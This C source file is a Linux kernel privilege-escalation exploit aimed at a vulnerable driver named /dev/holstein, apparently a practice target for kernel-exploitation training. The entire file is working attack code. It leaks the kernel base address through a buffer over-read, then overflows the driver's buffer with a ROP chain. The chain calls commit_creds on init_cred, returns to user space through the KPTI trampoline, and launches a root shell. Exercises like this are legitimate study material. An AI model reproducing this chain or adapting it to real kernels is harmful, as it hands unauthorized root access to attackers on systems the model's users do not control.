#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;

uint64_t vmlinux;

int fd;

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax prefix;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags));

    INFO("Saved state");
}

#define POP_RDI (vmlinux + 0x27bbdc)

#define COMMIT_CREDS (vmlinux + 0x06e390)
#define INIT_CRED (vmlinux + 0xE33500)
#define KPTI_TRAMPOLINE (vmlinux + 0x800e26)

void leak_vmlinux_base()
{
    char out_buf[0x410] = {};
    read(fd, out_buf, 0x410);

    vmlinux = *(uint64_t*)&out_buf[0x408] - 0x13d33c;
    return;
}

int main()
{
    save_state();
    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) {
        ERROR("open(\"/dev/holstein\")");
        exit(1);
    }

    leak_vmlinux_base();

    const int BUF_SIZE = 0x510;

    char buf[BUF_SIZE] = {};
    unsigned long *chain = (unsigned long *)&buf[0x408];
    *chain++ = POP_RDI;
    *chain++ = INIT_CRED;
    *chain++ = COMMIT_CREDS;
    // restore state
    *chain++ = KPTI_TRAMPOLINE;
    chain++;
    chain++;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, BUF_SIZE);

    close(fd);
    return 0;
}
